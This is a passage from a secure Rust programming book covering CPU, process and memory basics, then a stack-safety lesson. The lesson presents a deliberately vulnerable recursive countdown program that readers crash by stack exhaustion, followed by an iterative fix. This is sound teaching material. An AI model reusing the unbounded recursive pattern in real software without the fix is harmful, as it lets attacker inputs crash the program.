<ol>
<li>
<p>General Purpose (<code>GP*</code>) registers can store any kind of result at any time.</p>
</li>
<li>
<p>Special purpose registers (e.g. <code>IP</code>, <code>SP</code>, <code>CCR</code>) are used to track internal state during result processing.</p>
</li>
</ol>
<p>So how does <em>processing</em> actually work?
Both the instructions and data move back and forth between the CPU and RAM via a data bus<sup class="footnote-reference" id="fr-DataBus-1"><a href="#footnote-DataBus">8</a></sup>.
The address bus allows a CPU to specify a given memory location and size of data to be read or written.
Every CPU continually repeats a three step <em>instruction cycle</em> (try tracing each step below through the above diagram):</p>
<ol>
<li>
<p><strong>Fetch</strong> - Read an instruction from RAM currently addressed by the <strong>Instruction Pointer (IP)</strong> register<sup class="footnote-reference" id="fr-PC-1"><a href="#footnote-PC">9</a></sup>. Update the <code>IP</code> to point to the next instruction.</p>
<ul>
<li><em>Above diagram:</em> CPU sends the current <code>IP</code> value over the address bus, gets back the instruction pointed to over the data bus.</li>
</ul>
</li>
<li>
<p><strong>Decode</strong> - Interpret the meaning of the fetched instruction. It must include an <em>opcode</em> (unique encoding for its operation), but may also include <em>operands</em> (arguments for the operation) and/or a prefix (behavioral modifier).</p>
<ul>
<li><em>Above diagram:</em> CPU deciphers the semantics of the received instruction.</li>
</ul>
</li>
<li>
<p><strong>Execute</strong> - Execute the instruction to generate side-effects. Internally, this means a Control Unit (CU) passes instruction-specific signals to functional units. For example: the Arithmetic Logic Unit (ALU) is a functional unit which performs mathematical operations on register values.</p>
<ul>
<li>
<p><em>Above diagram:</em> Depending on the instruction, the CPU updates <code>SP</code>, <code>CCR</code>, and <code>GP*</code> registers. Additionally:</p>
<ul>
<li>
<p>If the instruction writes, the CPU sends an address to write over the address bus and data to be written over the data bus.</p>
</li>
<li>
<p>If the instruction reads, the CPU sends an address to read over the address bus and receives the corresponding data over the data bus.</p>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>Modern CPUs rely on complex optimizations, like instruction pipelining<sup class="footnote-reference" id="fr-Pipeline-1"><a href="#footnote-Pipeline">10</a></sup> and speculative execution<sup class="footnote-reference" id="fr-SpecExec-1"><a href="#footnote-SpecExec">11</a></sup>, to speed up the instruction cycle.
Fortunately, we don't have to consider or understand such minutia when programming day-to-day.</p>
<p>The jobs of various registers are, by contrast, important for a working mental model.
In addition to the IP, the two special purpose registers worth noting are:</p>
<ul>
<li>
<p>The <strong>Stack Pointer (<code>SP</code>)</strong> register - the address denoting the bottom of the current stack frame. A stack frame is akin to function's in-RAM "notepad" for computing and saving <em>function-local</em> results.</p>
<ul>
<li>In the statement <code>let x = 3 + 6;</code>, <code>x</code> will be computed using registers, then the value <code>9</code> will be stored on the stack<sup class="footnote-reference" id="fr-RegisterAlloc-1"><a href="#footnote-RegisterAlloc">12</a></sup>. This allows the CPU to re-use its small, fixed set of <code>GP*</code> registers for new computations when multiple functions are called in a program.</li>
</ul>
</li>
<li>
<p>The <strong>Condition Code Register (<code>CCR</code>)</strong> register collects the current status flag bits of a processor. Among other uses, this register helps implement conditional logic - like "jumping" the instruction pointer to a particular location if an operation's result is non-zero.</p>
<ul>
<li>This single register enables all the control flow constructs<sup class="footnote-reference" id="fr-DuffDev-1"><a href="#footnote-DuffDev">13</a></sup> we rely on as programmers, like <code>if</code> statements and <code>for</code> loops. <code>if z == true { do_1(); } else { do_2(); }</code> de-sugars to "test the equality of <code>z</code> and <code>true</code>, if equal set equality flag in <code>CCR</code>. If this equality flag in <code>CCR</code> is set, jump to <code>do_1()</code> and execute, else jump to <code>do_2()</code> and execute".</li>
</ul>
</li>
</ul>
<p>Let's recap: CPUs continually read and execute instructions from RAM, update internal registers, then read/write data from/to RAM.</p>
<p>With the basics of how hardware backs computation under our belt, we're almost ready to discuss  stack memory.
But first we need to understand one more concept: the process - a key OS-level abstraction.</p>
<h2 id="executable-vs-process"><a class="header" href="#executable-vs-process">Executable vs Process</a></h2>
<p>When a compiler outputs a program, it's represented as an executable file stored on disk.
Operating systems use different file formats to standardize the structure of executables: PE on Windows, ELF on Linux, and Mach-O on MacOS.
Every format contains sections storing:</p>
<ul>
<li>
<p><strong>A header</strong> (start of the file for all) - contains various metadata: identifier for file type, a description of contents, the offsets of additional sections and special tables (e.g. section header tables on Linux).</p>
</li>
<li>
<p><strong>Executable code</strong> (<code>.text</code> section on Linux) - the instructions encoding the compiled program's logic. Most of your hard work as a programmer lives here!</p>
</li>
<li>
<p><strong>Read-only data</strong> (<code>.rodata</code> section on Linux) - constant values, like static strings or hardcoded lookup tables.</p>
</li>
<li>
<p><strong>Writable data</strong> (<code>.data</code> on Linux) - initialized, writable, global variables and buffers. Aside: uninitialized data gets its own section (<code>.bss</code> on Linux, often zero-initialized in practice).</p>
</li>
</ul>
<p>A <em>process</em> is an instance of an executable that's currently running.
Meaning the OS has scheduled the process to receive CPU time, the executable bytes will churn through our aforementioned fetch/decode/execute cycle.</p>
<p>An OS's loader takes the contents of an on-disk executable, places them into memory, and prepares that memory for program execution.
A linker may also be involved to combine various pieces of code and data, potentially from several executables, either at compilation or load time.
Recall our <a href="https://highassurance.rs/chp2/operational_assurance_2.html#building-a-free-standing-binary">discussion of static vs dynamic linking</a> from Chapter 2.
Either way, the end result of the loading looks roughly like so:</p>
</br>
<p align="center">
  <img width="90%" src="chp4/program_process.svg">
  <figure>
  <figcaption><center>Mapping of on-disk, executable contents to in-memory process space.</center></figcaption><br>
  </figure>
</p>
<p>Because of an OS-provided abstraction called <em>virtual memory</em>, a process gets to assume its the only entity in a nearly limitless and entirely linear address space.
For all practical intents and purposes, its memory layout is the right-hand side of the diagram above.</p>
<p>Maintaining mappings from this virtual layout to physical storage shared by other processes is the job of the OS.
And a layer of complexity we can safely ignore in most day-to-day systems programming tasks.
Remember: a perfectly detailed model is seldom the most practical one, that's the beauty of abstraction design!</p>
<p>The most important takeaway from this section is that right side of the diagram.
Specifically how executable code, static memory, stack memory, and heap memory <em>co-exist</em> in the same process address space.
Both normal execution and program exploitation happen within the confines of this memory model.
This is what you'll be reasoning about when writing systems code.
It's important you commit it to memory, pun intended.</p>
<blockquote>
<p><strong>Linux Processes and System Calls</strong></p>
<p>Processes are a key concept in systems programming.
Let's take a slight detour to discuss the broader context.</p>
<p>Processes are run by and for users.
Hence they're sometimes called "userspace applications".
They have no special privileges, meaning they run in "ring 3" - the least privileged mode code can operate in<sup class="footnote-reference" id="fr-RingProt-1"><a href="#footnote-RingProt">14</a></sup>.
Many processes run simultaneously, each can't read/write from/to anything outside of their own virtual address space.</p>
<p>But what about the OS kernel itself?
Its code, data, stack, and heap are stored in an isolated memory area - "kernelspace".
The kernel runs in "ring 0", the most privileged mode available.
It can read/write from/to any processes's memory, directly access hardware, and control special CPU features.</p>
<p>Rings 2 and 3 are almost never used in practice<sup class="footnote-reference" id="fr-RingProt-2"><a href="#footnote-RingProt">14</a></sup>.
These modes were intended for device drivers, special programs that allow a kernel to communicate with vendor-specific hardware.
In reality most device drivers are loaded directly into the kernel, running alongside it in ring 0 (creating a major OS attack surface<sup class="footnote-reference" id="fr-MSKernBlocklist-1"><a href="#footnote-MSKernBlocklist">15</a></sup>).</p>
<p>When a userspace program needs to perform a privileged operation (e.g. spawn a new process) or interact with hardware (e.g. read a file from disk or send a request over a networks)  it must make a request to the kernel.
The low-level APIs for such requests are called "system calls" - "syscalls" for short.
The Linux kernel supports over 400 system calls, some of which are architecture-specific<sup class="footnote-reference" id="fr-SyscallTable-1"><a href="#footnote-SyscallTable">16</a></sup>.
Consider two common syscalls for managing processes lifecycles:</p>
<ul>
<li>
<p><strong><code>fork</code></strong> (syscall for duplicating a process) - A process can create a copy of itself. A script may want to run a helper task in parallel, a web server might want to scale to more requests. Forked process memory is copy-on-write. The original ("parent") process and the new copy (the "child") each see distinct virtual address spaces, but the common elements (e.g. identical code sections, data that's read-only or hasn't yet been modified) only appear once in physical RAM.</p>
</li>
<li>
<p><strong><code>execve</code></strong> (syscall for executable loading) - One program can execute another. The system call for doing so doesn't create a new process, instead it loads and runs a new program within the current process - overwriting all previous contents. The new segments are backed by the executable file of the new program.</p>
</li>
</ul>
<p>Let's integrate these two syscalls with an example: how does a commandline shell work?
When you enter a command, the shell <code>fork</code>s a child.
The child is given an executable path and arguments as input, it calls <code>execve</code> to replace itself with the requested application.
The shell, a parent process still running, captures the output via pipes - typically <code>stdout</code> for normal output and <code>stderr</code> for error prints.</p>
</blockquote>
<h2 id="takeaway-15"><a class="header" href="#takeaway-15">Takeaway</a></h2>
<p>The Central Processing Unit (CPU) is a tiny state machine continually operating on main memory or Random Access Memory (RAM).
RAM stores both code and data.
A CPU fetches, decodes, and executes instructions from RAM (code), then writes back results (data) if applicable.</p>
<p>A program must be loaded into memory, creating a <em>process</em>, before it can run.
That involves mapping it's executable code into RAM and setting up 3 special memory locations:</p>
<ol>
<li>Static memory - stores global variables and constants.</li>
<li>Stack memory - stores function frames, including local variables.</li>
<li>[Optionally] Heap memory - stores data shared between functions and threads.</li>
</ol>
<p>We'll cover stack and static memory next.
In the context of a language, agnostic reliability pattern.
Heap memory will come a bit later!</p>
<hr>
<ol class="footnote-definition"><li id="footnote-Chp1Levels">
<p>"Low-level" can be an ambiguous and overloaded term to apply to a programming language. We briefly explained our usage of the term in the <a href="https://highassurance.rs/chp1/why_this_book.html#languages-by-level">"Languages by Level"</a> section of Chapter 1. <a href="#fr-Chp1Levels-1">↩</a></p>
</li>
<li id="footnote-CorruptCrash">
<p><a href="https://www.s3.eurecom.fr/docs/ndss18_muench.pdf"><em>What You Corrupt Is Not What You Crash: Challenges in Fuzzing Embedded Devices</em></a>. Marius Muench, Jan Stijohann, Frank Kargl, Aurelien Francillon, Davide Balzarotti (2018). <a href="#fr-CorruptCrash-1">↩</a></p>
</li>
<li id="footnote-MarsVx">
<p><a href="https://trs.jpl.nasa.gov/bitstream/handle/2014/37499/05-0539.pdf"><em>An Overview of the Mars Exploration Rovers Flight Software</em></a>. Glenn Reeves (2014). <a href="#fr-MarsVx-1">↩</a></p>
</li>
<li id="footnote-CustomAlloc">
<p>Technically, Type-III systems <em>can</em> explicitly link in a custom allocator as part of the firmware build, essentially "bringing their own" heap support. But many, if not most, single-purpose devices won't do so - due to resource and/or reliability constraints. <a href="#fr-CustomAlloc-1">↩</a></p>
</li>
<li id="footnote-T3">
<p>For those curious: Type-III systems can have only one program, baked directly into Read-Only Memory (ROM), whose entry point is jumped to on device reset. Unlike general purpose systems, they don't require the flexibility of being able to run arbitrary executables. Hence they don't need the process abstractions we've diagramed above. <a href="#fr-T3-1">↩</a></p>
</li>
<li id="footnote-FixedLen">
<p>This is true certain Instruction Set Architectures (ISAs), like 32 and 64-bit ARM, that use fixed length encoding. Other ISAs, like x86, use variable length encoding. For 64-bit x86, instructions vary from 1 byte to 15 bytes in length. As you might imagine, that variability creates challenges for software disassemblers. <a href="#fr-FixedLen-1">↩</a></p>
</li>
<li id="footnote-MovObfu">
<p><a href="https://github.com/xoreaxeaxeax/movfuscator"><code>xoreaxeaxeax/movfuscator</code></a>. Chris Domas(Accessed 2023). In fact, arbitrary programs can be broken down into a sequence of just one instruction type: <code>mov</code>! Not efficient, but an effective obfuscation technique. <a href="#fr-MovObfu-1">↩</a></p>
</li>
<li id="footnote-DataBus">
<p>The hardware implementation of a data bus is akin to a multi-lane highway, where each lane is a physical, electrical connection between the CPU and RAM. <a href="#fr-DataBus-1">↩</a></p>
</li>
<li id="footnote-PC">
<p>An Instruction Pointer (IP) is often referred to as a Program Counter (PC), but will stick with IP in this book. <a href="#fr-PC-1">↩</a></p>
</li>
<li id="footnote-Pipeline">
<p><a href="https://en.wikipedia.org/wiki/Instruction_pipelining"><em>Instruction pipelining</em></a>. Wikipedia (Accessed 2022). <a href="#fr-Pipeline-1">↩</a></p>
</li>
<li id="footnote-SpecExec">
<p><a href="https://en.wikipedia.org/wiki/Speculative_execution"><em>Speculative execution</em></a>. Wikipedia (Accessed 2022). <a href="#fr-SpecExec-1">↩</a></p>
</li>
<li id="footnote-RegisterAlloc">
<p>In reality, an optimizing compiler could be clever enough to manage registers across function calls such that <code>x</code> never needs to be written to the stack and can be safely preserved in a register (which is faster to read and write). Our example illustrates the general case, not optimized special cases. <a href="#fr-RegisterAlloc-1">↩</a></p>
</li>
<li id="footnote-DuffDev">
<p><a href="https://en.wikipedia.org/wiki/Duff%27s_device"><em>Duff's Device</em></a>. Wikipedia (Accessed 2023). An interesting and bizarre example of C control flow. Unlike Rust, C allows unstructured control flow (including <code>goto</code> statements). <a href="#fr-DuffDev-1">↩</a></p>
</li>
<li id="footnote-RingProt">
<p><a href="https://en.wikipedia.org/wiki/Protection_ring"><em>Protection ring</em></a>. Wikipedia (Accessed 2022). <a href="#fr-RingProt-1">↩</a> <a href="#fr-RingProt-2">↩2</a></p>
</li>
<li id="footnote-MSKernBlocklist">
<p><a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules"><em>Microsoft recommended driver block rules</em></a>. Microsoft (Accessed 2023). <a href="#fr-MSKernBlocklist-1">↩</a></p>
</li>
<li id="footnote-SyscallTable">
<p><a href="https://marcin.juszkiewicz.com.pl/download/tables/syscalls.html"><em>Linux kernel system calls for all architectures</em></a> Marcin Juszkiewicz (Accessed 2022). <a href="#fr-SyscallTable-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="assurance-perspective-stack-safety"><a class="header" href="#assurance-perspective-stack-safety">Assurance Perspective: Stack Safety</a></h1>
<p>We'll learn about stack and static memory by hardening a small program.
Our first version is vulnerable: an attacker can exhaust system memory and crash the application ("denial-of-service" or DoS) by providing specific inputs.
Our patched version will comply with MISRA Rule 17.2 (essentially "no recursion", introduced in Chapter 3):</p>
<blockquote>
<p><strong>[RR, Rule 17.2]</strong> Functions can't call themselves recursively (directly or indirectly)<sup class="footnote-reference" id="fr-MISRA_2012-1"><a href="#footnote-MISRA_2012">1</a></sup></p>
</blockquote>
<p>That'll remediate the vulnerability and increase availability.
And the rule/pattern is relevant to any programming language that supports recursion!
You can readily apply this rule in Python, Java, Go, Swift, TypeScript, etc.</p>
<p>More generally, we're exploring a <strong>platform-agnostic</strong> and <strong>language-agnostic</strong> pattern for increasing the <strong>stack safety</strong> of a given function.</p>
<blockquote>
<p><strong>Recursion and Static Call Graphs</strong></p>
<p>The <a href="chp4/../chp16_appendix/icfg.html"><em>Theory: Inter-procedural CFGs</em></a> section of the Appendix briefly examines recursion in the context of graphs many static analysis tools rely on.
Its a short, optional aside we'd recommend after finishing this section - for those curious.</p>
</blockquote>
<h2 id="the-stack"><a class="header" href="#the-stack">The Stack</a></h2>
<p>Stack memory supports one of programming's most fundamental abstractions: the <em>function</em> (aka procedure, method, or subroutine).
Functions are called with parameters, perform some computation, and optionally return a result.
Thus hardware need a mechanism to<sup class="footnote-reference" id="fr-CSAPP-1"><a href="#footnote-CSAPP">2</a></sup>:</p>
<ol>
<li>
<p><strong>Pass control</strong> - Set the Instruction Pointer (IP) to the address to the function called and, when it's done, set it back to the statement following the call.</p>
</li>
<li>
<p><strong>Pass data</strong> - Provide parameters as input, and return a result. Either as a new value or a <code>mut</code>-ation of input(s).</p>
</li>
<li>
<p><strong>Allocate and deallocate working memory</strong> - The function called needs to acquire space for its local variables on entry, and release said space on return.</p>
</li>
</ol>
<p>Mechanically, stack memory supports all three requirements by just two simple operations: push and pop.
It works like the Last In First Out (LIFO) data structure of the same name: we can push items (addresses, variables, etc) and entire function's working memory blocks (called "frames") onto the stack and pop only from the top (most recently pushed item/frame).</p>
<p>The goal of stack memory is to support <em>fast</em> runtime allocation and deallocation for data whose size is fixed (known at compile time). So:</p>
<ul>
<li>
<p><strong>Stack frames</strong> are chunks of memory "scratch space" needed for a single function to execute. A frame includes all the fixed-size local variables used by a function.</p>
</li>
<li>
<p>The push operation (<strong>allocation</strong>) corresponds to a <strong>function call</strong>. Whenever you call a named function in your program, a new frame gets pushed onto the stack<sup class="footnote-reference" id="fr-Inlining-1"><a href="#footnote-Inlining">3</a></sup>. The called function (e.g. <em>callee</em>) gets scratch memory for its local variables, distinct from the <em>caller's</em> frame (which sits below it on the stack). The runtime stack grows downward, toward lower addresses.</p>
</li>
<li>
<p>The pop operation (<strong>deallocation</strong>) corresponds to a <strong>function return</strong>. Once a function exits (due to control reaching the <code>return</code> keyword or the end of function scope), its frame is discarded. To save time, data is not cleared/erased unless the programmer explicitly calls a function like C's <code>memset</code><sup class="footnote-reference" id="fr-Memset-1"><a href="#footnote-Memset">4</a></sup> or uses a crate like Rust's <code>zeroize</code><sup class="footnote-reference" id="fr-Zeroize-1"><a href="#footnote-Zeroize">5</a></sup>. For speed, <code>SP</code> is simply incremented instead. Accessing the old (lower address) data is no longer legal once its containing frame has been popped.</p>
</li>
</ul>
<blockquote>
<p><strong>Why is the stack fast?</strong></p>
<p>Unlike heap memory, the mechanics of stack memory are both directly supported in hardware and compile-time decidable.</p>
<p>Remember: the "stack pointer" is a CPU register (<code>SP</code>).
Optimized hardware tracks where the current stack top is.
Compilers emit dedicated CPU instructions to push [to] and pop [from] the stack efficiently.
We glance at these instructions in an assembly snippet below.</p>
</blockquote>
<p>Lets visualize how a code snippet uses the stack, to make the push/pop discussion more tangible.</p>
<pre><code class="language-rust ignore">#[inline(never)]
fn recursive_count_down(x: usize) -&gt; usize {
    // Base case
    if x == 0 {
        println!("Boom!");
        return x;
    // Recursive case
    } else {
        println!("{x}...");
        return recursive_count_down(x - 1);
    }
}

#[inline(never)]
fn square(x: usize) -&gt; usize {
    x * x
}

fn main() {
    let args: Vec&lt;String&gt; = std::env::args().collect();

    // 1st arg is binary name, e.g. "./stack_example 2"
    assert!(args.len() &lt;= 2, "Too many arguments - enter one number");

    let x = args
        .iter()
        .nth(1)
        .expect("No arguments")
        .parse()
        .expect("Please provide a number");

    let _ = recursive_count_down(square(x));
}</code></pre>
<ul>
<li>
<p>The <code>main</code> function parses a single commandline argument into a <code>usize</code> variable <code>x</code>. It'll terminate with an error message if no arguments are entered, more than 2 arguments are entered, or the sole argument isn't a positive number.</p>
</li>
<li>
<p><code>recursive_count_down(square(x));</code> calls one function to square the input argument, then another to print a count down sequence - from <code>x^2</code> to <code>0</code>.</p>
</li>
<li>
<p>We're interested in how this program uses stack memory at runtime, adding the attribute <code>#[inline(never)]</code> to ensure the compiler allocates a stack frame each time either <code>recursive_count_down</code> or <code>square</code> is called.</p>
<ul>
<li>"Inlining" is an opportunistic compiler optimization can avoids function call overhead, including stack frame allocation and caller-register preservation <sup class="footnote-reference" id="fr-Inlining-2"><a href="#footnote-Inlining">3</a></sup>. It's not always applicable and as programmer we don't directly decide where it is. So forgoing it is a realistic case to prepare for.</li>
</ul>
</li>
</ul>
<p>If run with <code>cargo run -- 2</code>, this program outputs:</p>
<pre><code class="language-ignore">4...
3...
2...
1...
Boom!
</code></pre>
<p>So what happened in stack memory during that execution?
Each function called allocates its own stack frame.
There's one for <code>main</code>, one for <code>square</code>, and one for <em>each</em> recursive call to <code>recursive_count_down</code>.</p>
<ul>
<li>
<p>Before every frame, the return address (that of the next statement to execute, where the CPU should point <code>IP</code> after a call completes) is also stack-pushed (down).</p>
</li>
<li>
<p>Certain calling conventions might require function arguments to be pushed onto the stack before that function's frame, others use registers for the first several arguments as an optimization (and stack push the remainder).</p>
<ul>
<li>For simplicity, We'll omit this detail, and a similar push/pop mechanisms for saving/restoring <em>callee-saved</em> registers.</li>
</ul>
</li>
</ul>
<p>With argument passing and register saving omitted, our stack when <code>Boom!</code> is printed looks like:</p>
</br>
<p align="center">
  <img width="70%" src="chp4/stack_example.svg">
  <figure>
  <figcaption><center>Stack diagram near end of above program's execution.</center></figcaption><br>
  </figure>
</p>
<h3 id="exhausting-a-processs-maximum-stack-space"><a class="header" href="#exhausting-a-processs-maximum-stack-space">Exhausting a Process's Maximum Stack Space</a></h3>
<p>The crate for the above program is located at <code>code_snippets/chp4/stack_example</code>.
Can you find an input that crashes the binary with the following error?
Where does this error come from?</p>
<pre><code class="language-ignore">thread 'main' has overflowed its stack
fatal runtime error: stack overflow
</code></pre>
<p>The binary search algorithm ("binary" meaning "two", not "compiled binary") is one way to find a large enough input.
But guessing a sufficiently large number is probably easiest.
Once you've found a <code>cargo run</code> command that triggers the crash, write it down.
You'll use that same input/attack to prove a fix is indeed viable.</p>
<p>Recall MISRA Rule 17.2 ("no recursion").
By applying this guidance, we can maintain this program's exact <em>interface</em> (command-line functionality, print output) but increase its memory-utilization robustness by bounding space complexity.</p>
<p>First, let's understand the core problem: exponential, <em>O(n^2)</em>, stack space utilization.
Attacker input exercises asymmetric control over stack memory usage.
We scale relative to input integer ("R" indicates a recursive function):</p>
</br>
<p align="center">
  <img width="80%" src="chp4/stack_scaling_1.svg">
  <figure>
  <figcaption><center>Visualizing <i>O(n^2)</i> stack usage as a function of input.</center></figcaption><br>
  </figure>
</p>
<blockquote>
<p><strong>A Universal Failure Mode</strong></p>
<p>Recursion risks stack exhaustion for any Type-I, II, or III system.
Of any CPU architecture.</p>
</blockquote>
<h3 id="hardening-for-stack-safety"><a class="header" href="#hardening-for-stack-safety">Hardening for Stack Safety</a></h3>
<p>To address MISRA 17.2, replace <code>recursive_count_down</code> with a new <code>iterative_count_down</code> implementation:</p>
<pre><code class="language-rust ignore">#[inline(never)]
fn iterative_count_down(x: usize) {
    for i in (0..=x).rev() {
        match i {
            i if i == 0 =&gt; println!("Boom!"),
            _ =&gt; println!("{i}..."),
        }
    }
}</code></pre>
<p>Our stack scaling is now constant, <em>O(1)</em>, for all inputs ("I" indicates an iterative function):</p>
</br>
<p align="center">
  <img width="80%" src="chp4/stack_scaling_2.svg">
  <figure>
  <figcaption><center>Visualizing O(1) stack usage as a function of input.</center></figcaption><br>
  </figure>
</p>
<p>To validate the program will no longer terminate on memory exhaustion, try re-running it with the crashing input you discovered earlier.
Isn't seeing that success satisfying, as an engineer?</p>
<p>Before closing, let's understand how static memory supports our program's static strings.</p>
<blockquote>
<p><strong>Rust != Stack Safety</strong></p>
<p>Rust is memory-safe for the most part.
It's a massive leap over incumbents.
But stack safety, the ability to detect a stack overflow caused by recursion or otherwise, is platform-specific.</p>
<p>When you found a crashing input, your OS did the detection and preemptively killed your process.
Now <code>rustc</code> did help - it inserted <em>stack probes</em> at compilation time, enabling immediate passing of control to the OS if a stack data write limit is hit at runtime.</p>
<p>But many <code>#![no_std]</code> systems don't support this detection feature.
Had our program been running on Type-III microcontroller, the overflow could have gone undetected - our function could have corrupted whatever data happened to be stored past a pre-set stack limit.
On some systems, that might even include a bootloader!</p>
<p>MISRA C 17.2 a is valuable guideline for {platform,language}-agnostic stack safety.
It can help eliminate overflow potential in a program.</p>
<p>But we still need to ensure worst case stack usage, for any iterative call-chain, doesn't exceed the capabilities of a target platform.
So complete stack safety is an ambitious goal.
<code>cargo call-stack</code><sup class="footnote-reference" id="fr-CargoCallStack-1"><a href="#footnote-CargoCallStack">6</a></sup> can help.</p>
</blockquote>
<h2 id="static-memory"><a class="header" href="#static-memory">Static Memory</a></h2>
<p>Static memory contains <em>global</em> data.
Not just global variables in the source code (though those do live in static memory), hardcoded strings and constant data (e.g. file bytes baked in at compile-time via the <code>include!</code> macro[^IncludeMacro]) end up there too.
For Rust specifically:</p>
<ul>
<li>
<p>Static memory additionally holds any variable declared with the <code>static</code> keyword.</p>
</li>
<li>
<p>Counter-intuitively, items with a <code>'static</code> lifetime may or may not be stored in static memory.</p>
</li>
<li>
<p>The <code>const</code> keyword allows values to be computed at compile time. The resulting value might be inlined directly wherever the variable name is used, ending up encoded within the executable instruction stream - not in a static memory location.</p>
</li>
</ul>
<p>Your program's executable code technically also resides in static memory, though the above diagram uses a separate box to distinguish it.</p>
<p>Some static memory sections are read-only, others are writeable - this is relevant to exploitation, but let's ignore this detail for now and focus on what "global" actually entails:</p>
<ol>
<li>
<p>Data in static memory is available for the <em>entire</em> lifetime of the program. From the time it starts to the time it terminates.</p>
</li>
<li>
<p>Static memory is shared between threads. This has synchronization dangers (e.g. data races) and performance-degrading workarounds (e.g. global locks/mutexes). But it's also useful and convenient.</p>
</li>
</ol>
<blockquote>
<p><strong>What are threads?</strong></p>
<p>Processes have a lightweight alternative: threads.
Multiple threads co-exist within the address space of one process.
Each thread has <em>its own</em> stack (see the previous section's file-to-process diagram).</p>
<p>Multithreading has two important advantages over multiprocessing:</p>
<ol>
<li>
<p><strong>Scheduling efficiency</strong> - the OS kernel can schedule threads more efficiently, thanks to the ability to share certain kernelspace data structures and CPU-level optimizations (e.g. Intel's "hyper-threading"[^HyperThread] technology).</p>
</li>
<li>
<p><strong>Data passing between concurrent components</strong> - threads can share data amongst themselves more easily and efficiently than processes, they often don't need to wait for or rely on the kernel as an intermediary for data passing. Static memory is one direct means, since it's shared among the multiple threads within a single process.</p>
</li>
</ol>
</blockquote>
<p>Let's quickly peak at simplified/unoptimized assembly (the instruction stream a CPU crunches) for function <code>recursive_count_down</code>.
We won't go line-by-line.
But a few details will help us better understand memory layout.
First, recall the source code:</p>
<pre><code class="language-rust ignore">#[inline(never)]
fn recursive_count_down(x: usize) -&gt; usize {
    // Base case
    if x == 0 {
        println!("Boom!");
        return x;
    // Recursive case
    } else {
        println!("{x}...");
        return recursive_count_down(x - 1);
    }
}</code></pre>
<p>Using <a href="https://godbolt.org/z/4rzsrGscx">https://godbolt.org</a> to generate assembly (your results may vary depending on compiler version<sup class="footnote-reference" id="fr-GenCompVer-1"><a href="#footnote-GenCompVer">7</a></sup>) with the <code>-C "opt-level=z"</code> flag (optimizing for small code size - and also human readability):</p>
<pre><code class="language-assembly ignore">example::recursive_count_down:
        push    rbx
        sub     rsp, 80
        mov     qword ptr [rsp + 8], rdi
        test    rdi, rdi
        je      .LBB0_1
        lea     rbx, [rsp + 8]
        lea     rax, [rsp + 16]
        mov     qword ptr [rax], rbx
        lea     rcx, [rip + .L__unnamed_1]
        lea     rdi, [rsp + 32]
        mov     qword ptr [rdi], rcx
        mov     qword ptr [rdi + 8], 2
        and     qword ptr [rdi + 32], 0
        mov     rcx, qword ptr [rip + core::fmt::num::imp::&lt;impl core::fmt::Display for usize&gt;::fmt@GOTPCREL]
        mov     qword ptr [rax + 8], rcx
        mov     qword ptr [rdi + 16], rax
        mov     qword ptr [rdi + 24], 1
        call    qword ptr [rip + std::io::stdio::_print@GOTPCREL]
        mov     rdi, qword ptr [rbx]
        dec     rdi
        call    qword ptr [rip + example::recursive_count_down@GOTPCREL]
        jmp     .LBB0_3
.LBB0_1:
        lea     rax, [rip + .L__unnamed_2]
        lea     rdi, [rsp + 32]
        mov     qword ptr [rdi], rax
        mov     qword ptr [rdi + 8], 1
        lea     rax, [rip + .L__unnamed_3]
        mov     qword ptr [rdi + 16], rax
        xorps   xmm0, xmm0
        movups  xmmword ptr [rdi + 24], xmm0
        call    qword ptr [rip + std::io::stdio::_print@GOTPCREL]
        xor     eax, eax
.LBB0_3:
        add     rsp, 80
        pop     rbx
        ret

.L__unnamed_3:

.L__unnamed_4:
        .ascii  "...\n"

.L__unnamed_1:
        .quad   .L__unnamed_3
        .zero   8
        .quad   .L__unnamed_4
        .asciz  "\004\000\000\000\000\000\000"

.L__unnamed_5:
        .ascii  "Boom!\n"

.L__unnamed_2:
        .quad   .L__unnamed_5
        .asciz  "\006\000\000\000\000\000\000"
</code></pre>
<blockquote>
<p><strong>What does this assembly mean?</strong></p>
<p>We don't teach assembly in this book to keep scope in check.
But being able to read assembly can be useful in a pinch for systems programming.
And it's a pre-requisite to in-depth binary exploitation.</p>
<p>To get up to speed for the binary attacker side of things, consider <a href="https://amzn.to/3wvtCwa"><em>Practical Binary Analysis: Build Your Own Linux Tools for Binary Instrumentation, Analysis, and Disassembly</em></a><sup class="footnote-reference" id="fr-PBA-1"><a href="#footnote-PBA">8</a></sup>, <em>Appendix A: A Crash Course on x86 Assembly</em> is a quick primer for Intel machines.</p>
<p>For our purposes, note two instructions above:</p>
<ul>
<li><code>sub rsp, 80</code> (near start) - push frame, decrement Stack Pointer (<code>SP</code>) by 80 bytes.</li>
<li><code>add rsp, 80</code> (near end) - pop frame, increment Stack Pointer (<code>SP</code>) by 80 bytes.</li>
</ul>
</blockquote>
<p>There's a lot going on in that assembly snippet.
One detail relevant to understanding static memory: each frame <em>did not</em> allocate a unique copy of each string - only a short (host integer width) pointer to a static memory location holding the ASCII string.</p>
<p>Visually, this means multiple recursive frames all referenced the same strings stored for printing output:</p>
</br>
<p align="center">
  <img width="50%" src="chp4/static_strings.svg">
  <figure>
  <figcaption><center>Stack frames referencing static strings.</center></figcaption><br>
  </figure>
</p>
<p>What does that imply in terms of stack exhaustion?</p>
<ul>
<li>
<p><strong>Degradation Ratio</strong> - Static memory has a nearly (sans pointer width) <code>1:N</code> drag on stack memory utilization, where:</p>
<ul>
<li>
<p><code>1</code> is the single copy of a static data item.</p>
</li>
<li>
<p><code>N</code> is recursion depth for references to <code>1</code> item.</p>
</li>
<li>
<p><code>1:N</code> has <em>no effect</em> on <strong>algorithmic space complexity</strong> (unlike stack-memory's <code>N:N</code> data).</p>
</li>
</ul>
</li>
<li>
